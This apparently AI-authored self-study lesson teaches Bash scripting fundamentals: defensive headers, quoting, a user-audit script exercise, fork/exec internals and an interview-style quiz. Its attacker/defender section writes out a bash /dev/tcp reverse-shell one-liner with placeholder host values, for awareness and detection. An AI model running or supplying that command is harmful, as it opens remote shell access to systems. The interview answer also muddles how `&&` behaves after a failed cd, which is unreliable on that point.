# Lesson 03 — Bash Scripting Fundamentals

**Status:** ready for self-study · **Date written:** 2026-06-11
**Gate Rule:** Concept → Real-World Use → Alternatives → Hands-On → Verification → Quiz → Reflection → Search Keywords
(see `docs/learning/CLAUDE_TEACHING_RULES.md`)

> **How to use this lesson:** Read Steps 1–3, then build the script in Step 4 yourself
> (commands/structure are given, not the finished file). Run Step 5's verification
> against your own script. Answer the Step 6 quiz inline, then ask Navi for the
> professional-answer comparison. Fill in Step 7 yourself. Step 8 is for further
> reading.

---

## Step 1 — Concept

### What it is

A **Bash script** is a text file of shell commands, executed top-to-bottom by `/bin/bash`,
that automates a sequence of tasks you'd otherwise type by hand. Anything you can run
on the command line, you can put in a script — plus variables, conditionals, loops,
functions, and error handling to make it reliable and repeatable.

### Why it exists

Manual command sequences don't scale: they're not repeatable exactly, not
auditable, and error-prone under pressure (3am incident, tired hands). Scripts turn
"a sequence of steps I remember" into "a versioned, testable artifact" — which is
*why* `CLAUDE_TEACHING_RULES.md` Rule 11 mandates a real `/scripts` directory: every
script is a piece of NaviOps' operational memory.

### What problem it solves

| Problem | Bash solution |
|---|---|
| "Run these 8 commands every morning to check server health" | `healthcheck.sh` |
| "Audit which users have sudo / weak permissions" | `user_audit.sh` |
| "I always forget the exact `find` flags for old log cleanup" | `log_cleanup.sh` |
| "New hire needs to repeat my exact diagnostic steps" | A script *is* the documentation |

### Three-Level Depth (Lens A)

- **Level 1 — Beginner:** A script is a file starting with `#!/usr/bin/env bash`,
  made executable (`chmod +x`), containing commands run in order. Variables
  (`NAME="value"`, used as `$NAME` or `"${NAME}"`), conditionals (`if`/`elif`/`else`/
  `fi`), loops (`for`/`while`/`do`/`done`), and functions (`name() { ...; }`) are the
  building blocks.
- **Level 2 — SysAdmin:** Production scripts add **defensive headers**
  (`set -euo pipefail`), **argument parsing** (`$1`, `$#`, `getopts`), **logging**
  (timestamped output to a log file, not just stdout), **exit codes** (`exit 0` =
  success, non-zero = specific failure reasons other scripts/cron can check), and
  **idempotency** (running it twice doesn't cause harm — critical for cron jobs and
  Ansible-style automation later).
- **Level 3 — Systems/Kernel (Lens D):** When you run a script, the shell calls
  `fork()` to create a child process, then `exec()` to replace that child's memory
  image with `/bin/bash` running your script. Each external command in your script
  (`ls`, `grep`, `awk`) is *another* `fork()`+`exec()` — a brand-new process with its
  own PID. The parent shell calls `wait()` to block until the child finishes and
  collects its **exit status** (an integer 0–255, stored in the kernel's process table
  and surfaced to bash as `$?`). A pipeline (`cmd1 | cmd2`) forks *both* commands
  simultaneously and connects them with a kernel **pipe** (an in-memory ring buffer,
  via the `pipe()` syscall) — this is *why* `set -o pipefail` matters (Step 2):
  without it, bash's `$?` only reflects the **last** process in the pipe, hiding
  failures in earlier ones.

### Analogy (Lens B)

A Bash script is like a **recipe card** versus cooking from memory:
- **Variables** = labeled ingredient containers ("set aside `$FLOUR`, use it twice").
- **Functions** = sub-recipes you can reuse ("make the sauce" — defined once, called
  from multiple dishes).
- **Conditionals** = "if the oven isn't preheated, wait 5 minutes first."
- **`set -e`** = "if any step fails (burned the roux), stop the whole recipe — don't
  keep cooking on top of a mistake."
- **Exit codes** = the note you leave on the finished dish: `0` = "turned out fine",
  anything else = a specific code for "what went wrong" that the next recipe (or a
  person checking your work) can read without re-doing your steps.

This analogy holds well for linear scripts. It breaks down for **pipelines and
background jobs** — a recipe card doesn't have an equivalent of two processes running
*simultaneously*, connected by a live data stream (the pipe).

---

## Step 2 — Real-World Use

### How SysAdmins use Bash daily (2026 baseline)

Per [OneUptime's production shell scripting guide](https://oneuptime.com/blog/post/2026-02-13-shell-scripting-best-practices/view)
and [DigitalOcean's advanced Bash tutorial](https://www.digitalocean.com/community/tutorials/advanced-bash-scripting),
the standard production script header is:

```bash
#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'
```

- `set -e` — exit immediately if any command fails (non-zero exit).
- `set -u` — treat unset variables as errors (catches typos like `$FIEL` instead of
  `$FILE`).
- `set -o pipefail` — a pipeline (`cmd1 | cmd2`) fails if **any** stage fails, not just
  the last one (Lens D explains why this is necessary — `$?` normally reflects only
  the last process in the pipe).
- `IFS=$'\n\t'` — prevents word-splitting on spaces, so filenames with spaces don't
  silently break loops.

**Common real-world scripts:**
1. **Health checks** — disk usage, memory, load average, service status, run via cron
   every 5 minutes, alert if thresholds breached.
2. **User/permission audits** — list users with UID 0, check for world-writable files,
   verify `/etc/shadow` permissions (`600`).
3. **Log rotation/cleanup** — delete logs older than N days, compress before deleting.
4. **Backup scripts** — tar + timestamp + copy to remote/S3, with verification.
5. **Deployment scripts** — pull latest code, restart services, verify health endpoint.

### Common mistakes

| Mistake | Impact | Fix |
|---|---|---|
| No `set -euo pipefail` | Script continues after a failed command, causing cascading damage | Always set it as the first line |
| Unquoted variables (`rm $DIR/*`) | Word-splitting/globbing breaks on spaces or empty `$DIR` (`rm /*`!) | Always quote: `"$DIR"` |
| `cd` without checking success | If `cd /backup` fails, the next `rm -rf *` runs in the **wrong directory** | `cd /backup || exit 1` |
| Hardcoded paths/usernames | Breaks when run on a different host or by a different user | Use variables, `$(whoami)`, config files |
| No logging | Can't debug what happened during a 3am cron failure | Timestamped log function (Step 4) |
| Using `function foo {` | Non-portable (bashism); `foo() {` is POSIX | Use `name() { ...; }` ([bashstyle](https://gist.github.com/outro56/4a2403ae8fefdeb832a5)) |

### When NOT to use Bash

- **Complex data structures / JSON parsing** — Python (with `json` module) is far less
  error-prone than `jq`+string-munging for anything beyond simple cases.
- **Cross-platform tools** — Bash assumes a POSIX-ish environment; Python/Go are safer
  for tools that must run on Windows too.
- **Anything with real algorithms** (sorting, complex math, retries with backoff
  logic) — Bash *can* do it, but readability collapses fast. Bash shines as **glue**
  between other commands, not as a general-purpose language.

### Interview Angle

**Question:** "We had a cron job that ran a cleanup script every night. One night it
deleted way more than expected. The script started with `cd $BACKUP_DIR && rm -rf *`.
Walk me through what could have gone wrong and how you'd prevent it."

A **junior** answer stops at "they should have quoted the variable" — true, but
incomplete. A **senior** answer covers the full chain: if `$BACKUP_DIR` is unset (no
`set -u`) and unquoted, `cd $BACKUP_DIR` silently fails or `cd`s to `$HOME`, then `&&`
still runs `rm -rf *` in whatever directory the shell landed in — because there's no
`set -e` to stop after the `cd` failure, and no `cd "$BACKUP_DIR" || exit 1` check.
The senior fix is the full header (`set -euo pipefail`, `IFS=$'\n\t'`), explicit
quoting, and explicit failure handling on `cd` — not just one isolated fix, but
recognizing this as a *class* of defensive-scripting gap.

---

## Step 3 — Alternatives

### Alternative scripting languages for ops automation

| Tool | Strengths | Weaknesses | When to reach for it |
|---|---|---|---|
| **Bash** | Universal (every Linux box has it), perfect for gluing CLI tools | Weak data structures, fragile string handling | Quick automation, glue scripts, cron jobs |
| **Python** | Real data structures, libraries (`boto3` for AWS, `requests`), readable | Not always preinstalled on minimal images; slower startup | Anything with JSON/APIs/complex logic — common for AWS automation |
| **Ansible** (YAML + Python under the hood) | Declarative, idempotent by design, agentless | Steeper learning curve, overkill for one-off scripts | Configuration management across many hosts (Lesson 13) |
| **Perl** | Powerful text processing (legacy) | Declining usage, "write-only" reputation | Maintaining legacy scripts only |
| **PowerShell** | First-class on Windows, object pipeline (not just text) | Less common in Linux-first shops | Mixed Windows/Linux environments |

### Within Bash: alternative approaches to error handling

| Approach | How | Trade-off |
|---|---|---|
| `set -e` (this lesson) | Script-wide: any failure exits | Simple, but can exit at unexpected points (e.g., inside `if cmd; then` — `set -e` doesn't fire there, which surprises people) |
| Manual `if ! cmd; then ... fi` per command | Explicit, fine-grained | Verbose for long scripts |
| `trap 'cleanup' ERR EXIT` | Runs a cleanup function on any error or normal exit | Best for scripts that create temp files/locks — combine with `set -e` |

**For NaviOps:** `set -euo pipefail` + `trap` for cleanup is the production standard
(per [SIPB's "Writing Safe Shell Scripts"](https://sipb.mit.edu/doc/safe-shell/)) —
this is what Step 4 will use.

---

## Step 4 — Hands-On Task (build this yourself)

**Goal:** Build `scripts/user_audit.sh` — a script that audits the **permissions and
ownership facts from Lesson 01** and reports them. This is also your vehicle for the
6-item spaced review (Lesson 01 carry-over: directory r/x distinction, recursive
chmod/chown/chgrp pitfalls, chown vs chgrp root requirements; Lesson 02 carry-over:
`git pull` internals, merge-conflict mechanics, leaked-secret ordering — the Git items
you'll revisit in Step 7's reflection by relating them to how *this script itself*
should be committed).

### Lens C — Manual → Automated → Why

**Manual version** (what you'd type by hand):
```bash
ls -ld /home/*                      # check directory permissions
find /home -perm -o+w -type f       # find world-writable files (security risk)
awk -F: '$3 == 0 {print $1}' /etc/passwd   # find UID 0 (root-equivalent) accounts
```

**Automated version** — wrap those commands in a script with a header, logging, and a
summary. **Build it yourself** in `scripts/user_audit.sh` — don't copy a finished
script; this lesson *is* learning to assemble one. Spec:

- **Header:** `#!/usr/bin/env bash` + `set -euo pipefail` + `IFS=$'\n\t'` (Step 2's
  production header).
- **`LOG_FILE`** variable → `/tmp/user_audit_$(date +%Y%m%d_%H%M%S).log`.
- **`log()`** — takes a message, prints it to stdout **and** appends a timestamped copy
  to `LOG_FILE` (hint: `tee -a`). This is the logging primitive you'll reuse in every
  future lesson's script.
- **`check_uid0_accounts()`** — wrap: `awk -F: '$3 == 0 {print $1}' /etc/passwd`.
- **`check_world_writable()`** — take a target dir as `$1`, wrap:
  `find "$dir" -type f -perm -o+w` (swallow permission-denied noise with `2>/dev/null`).
- **`check_home_permissions()`** — loop over `/home/*/`, skip non-dirs, `stat` each.
- **`main()`** — log a start banner, call the three checks in order, log a completion
  banner with the log-file path; finish the file with `main "$@"`.

Every command is in the *Manual version* above; the skill being graded is the wiring
(functions, arguments, a `log()` helper, `main`), the error handling, and writing it in
your own voice. Commit it as your own work.

**Why this is valuable** (the "why" production engineers care about):
- **Consistency** — the same checks run the same way every time, no "did I remember
  the `-perm` flag right?"
- **Speed** — one command (`./user_audit.sh`) vs. 5+ manual commands.
- **Auditability** — the timestamped log is evidence ("we ran this audit on this
  date, here's the output") — exactly the audit-trail value Lesson 02 covered for Git.
- **What production engineers automate**: this exact pattern (UID 0 check,
  world-writable scan, permission report) is a real CIS-benchmark-style check —
  Lesson 23 (Security Monitoring) builds directly on this.

### What to build, step by step

1. Create `scripts/user_audit.sh` with the structure above (fill in any gaps yourself
   — `local`, function syntax, `tee -a`).
2. `chmod +x scripts/user_audit.sh`.
3. Run it: `./scripts/user_audit.sh` — read every line of output and make sure you
   understand *why* each check matters (tie back to Lesson 01's permission model).
4. Extend it with **one argument**: `./scripts/user_audit.sh /home` vs
   `./scripts/user_audit.sh /var/www` — use `$1` with a default
   (`TARGET_DIR="${1:-/home}"`).
5. Commit it on a new branch (`lesson/03-bash-scripting-fundamentals`) following
   Lesson 02's Git workflow — Conventional Commits message
   (`feat(lesson-03): add user_audit.sh script`).

### Lens D — small focused C example (optional, for the curious)

The `fork()`/`exec()`/`wait()` cycle from Step 1's Level 3 explanation, in ~15 lines
of C (illustrative — you don't need to compile this to complete the lesson, but it's
worth reading):

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/wait.h>

int main(void) {
    pid_t pid = fork();              // create child process
    if (pid == 0) {
        execlp("ls", "ls", "-l", NULL);   // child: replace image with `ls -l`
    } else {
        int status;
        wait(&status);                // parent: wait for child to finish
        printf("child exited with %d\n", WEXITSTATUS(status));
    }
    return 0;
}
```

This is *literally* what bash does for every external command in your script —
`WEXITSTATUS(status)` is where `$?` comes from.

---

## Step 5 — Verification

### How to verify your script works

```bash
# 1. Syntax check without running it
bash -n scripts/user_audit.sh

# 2. Run it and confirm it produces output + a log file
./scripts/user_audit.sh
ls -la /tmp/user_audit_*.log

# 3. Confirm set -euo pipefail is actually working: introduce a deliberate
#    typo in a variable name temporarily and confirm the script exits with
#    an error (then revert the typo)

# 4. Confirm it's executable and has a shebang
head -1 scripts/user_audit.sh    # should print: #!/usr/bin/env bash
ls -l scripts/user_audit.sh      # should show -rwxr-xr-x
```

### Expected output (approximate)

```
[2026-06-12 10:00:00] === User Audit started ===
[2026-06-12 10:00:00] Checking for UID 0 (root-equivalent) accounts...
root
[2026-06-12 10:00:00] Checking for world-writable files under /home...
[2026-06-12 10:00:00] Checking home directory permissions...
drwxr-x--- sys-ctl:sys-ctl /home/sys-ctl/
[2026-06-12 10:00:00] === User Audit complete. Log: /tmp/user_audit_20260612_100000.log ===
```

### Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| `Permission denied` running `./scripts/user_audit.sh` | Not executable | `chmod +x scripts/user_audit.sh` |
| `unbound variable` error | `set -u` caught a typo | Check variable names — this is `set -u` working as intended |
| Script exits silently after one command fails | `set -e` working as intended | Check the failed command's exit code; add error handling if it's expected to fail sometimes |
| `find: '/home': Permission denied` | Running as non-root, some dirs unreadable | Expected — the `2>/dev/null \|\| true` in `check_world_writable` handles this |

### Redaction check ✅

Before committing: confirm `user_audit.sh` and any captured output contain no real
usernames beyond your own local account, no real hostnames, and no AWS/account data —
this script only reads local filesystem metadata, but **double-check any pasted output**
in the lesson/commit per `navi.project.md` Hard Rule #1.

---

## Step 6 — Quiz (Interview-Style, Graded)

> **Instructions:** Answer each question directly under it. Once answered, ask Navi
> for the Professional Answer comparison for each.

**Q1.** What does `set -euo pipefail` do, line by line? Give an example of a bug each
flag would catch.

> **Your answer:**

**Q2.** Why must you quote variables like `"$DIR"` in commands like `rm -rf "$DIR"/*`?
What's the worst-case failure if you don't?

> **Your answer:**

**Q3.** A cron job runs your script every 5 minutes. The script isn't idempotent —
explain what that means here, and give a concrete example of how a non-idempotent
health-check script could cause harm over time.

> **Your answer:**

**Q4.** Your script has a pipeline: `grep ERROR /var/log/app.log | wc -l`. If
`/var/log/app.log` doesn't exist, what does `$?` show with and without
`set -o pipefail`? Why does this matter?

> **Your answer:**

**Q5.** **Scenario:** Your `user_audit.sh` script reports a user's home directory as
`drwxr-xr-x`. Based on Lesson 01, can other users **list** the contents of that
directory? Can they **enter/access** files inside it (assuming they know the
filename)? Explain the `r` vs `x` distinction precisely. *(Spaced review — Lesson 01
carry-over.)*

> **Your answer:**

**Q6.** **Scenario:** You need to recursively fix permissions on `/srv/shared` so a
group of users can collaborate, but `chmod -R 775 /srv/shared` has a known pitfall.
What is it, and what's the better fix (setgid bit / ACLs)? *(Spaced review — Lesson 01
carry-over.)*

> **Your answer:**

**Q7.** You're about to commit `scripts/user_audit.sh`. Based on Lesson 02, walk
through the exact Git commands you'd run, and explain what `git diff --staged` shows
you *before* committing — why is that check valuable for a script like this one?

> **Your answer:**

**Q8.** Your script writes secrets (e.g., it temporarily echoes an API key for
debugging) to `/tmp/user_audit_*.log`, and you accidentally `git add` that log file.
Walk through the leaked-secret response from Lesson 02 — what's the correct order of
operations? *(Spaced review — Lesson 02 carry-over.)*

> **Your answer:**

---

## Step 7 — Reflection

*(Fill in after the quiz)*

- What did you learn?
- What confused you?
- What would you do differently?

### Spaced Review — status

This lesson's Q5/Q6 directly re-test the 3 Lesson 01 carry-over items (directory `r`
vs `x`, recursive chmod/setgid/ACL fix, chown/chgrp root requirements — note: Q6
covers chmod/setgid/ACL; chown vs chgrp root requirements should be folded into your
Q6 answer if relevant to `/srv/shared`'s ownership). Q7/Q8 re-test the Lesson 02
carry-over items (git diff --staged habit touches the "git pull internals" and
"merge-conflict mechanics" spirit by reinforcing *deliberate* staging; Q8 directly
re-tests leaked-secret ordering).

---

## Lens E — Attacker & Defender (Red / Blue)

> Red/Blue framing (Gate Rule **Lens E**, D14). Build *both* mindsets: know how the
> tools in this lesson are abused, and how a defender detects and stops them.
> Frameworks: [GTFOBins](https://gtfobins.github.io/) · [MITRE ATT&CK](https://attack.mitre.org/) · [LOLBAS](https://lolbas-project.github.io/).

**🔴 Attacker (how it's abused — Step 2):** Bash is the #1 post-exploitation shell: reverse shells (`bash -i >& /dev/tcp/<ip>/<port> 0>&1`), LOLBin one-liners, and obfuscated payloads. Insecure scripts add command injection via unquoted variables, `eval`, or world-writable scripts run by root/cron. ATT&CK **T1059.004** (Unix Shell).

**🔵 Defender (detect & harden — Step 5):** Write defensively: `set -euo pipefail`, **quote every variable**, validate input, avoid `eval`, give scripts least-privilege ownership/perms, log actions, and hunt `/dev/tcp` or odd outbound connections in history and network logs.

## Step 8 — Search Keywords For Further Understanding

**Core**
- `bash set -euo pipefail explained`
- `bash function syntax best practices`
- `bash quoting variables why`
- `bash trap cleanup temp files`

**Tools**
- `shellcheck bash linter`
- `bash getopts argument parsing tutorial`
- `bash idempotent script cron`

**Going further (future lessons)**
- `linux fork exec wait system calls explained`
- `cis benchmark linux permissions audit script`
- `ansible vs bash when to use which`

---

**Red / Blue (Lens E — study attacker & defender in parallel):**
- 🔴 **Red (attacker):** `bash reverse shell /dev/tcp`, `MITRE ATT&CK T1059.004 unix shell`, `command injection bash unquoted variable`, `LOLBins linux`
- 🔵 **Blue (defender):** `bash set -euo pipefail security`, `shellcheck static analysis`, `detect reverse shell linux`, `secure bash scripting practices`

## Lesson Status

- [ ] Hands-on task completed (Step 4) — `scripts/user_audit.sh` built, tested, committed
- [ ] Verification passed (Step 5)
- [ ] Quiz answered + professional-answer comparisons requested (Step 6)
- [ ] Reflection completed (Step 7)
- [ ] Search Keywords reviewed (Step 8)

When all boxes are checked, run the **Update Protocol**
(`docs/learning/CLAUDE_TEACHING_RULES.md`) to update `LEARNING_STATE.md`,
`docs/STATUS.md`, `docs/CHANGELOG.md`, and `docs/TODO.md`, then move to **Lesson 04 —
Linux Users, Groups & Process Management**.

---

*Lesson 03 written by Navi v28 · 2026-06-11 · WebSearch sources:
[OneUptime shell scripting best practices](https://oneuptime.com/blog/post/2026-02-13-shell-scripting-best-practices/view),
[DigitalOcean advanced Bash](https://www.digitalocean.com/community/tutorials/advanced-bash-scripting),
[SIPB Writing Safe Shell Scripts](https://sipb.mit.edu/doc/safe-shell/),
[bashstyle](https://gist.github.com/outro56/4a2403ae8fefdeb832a5)*
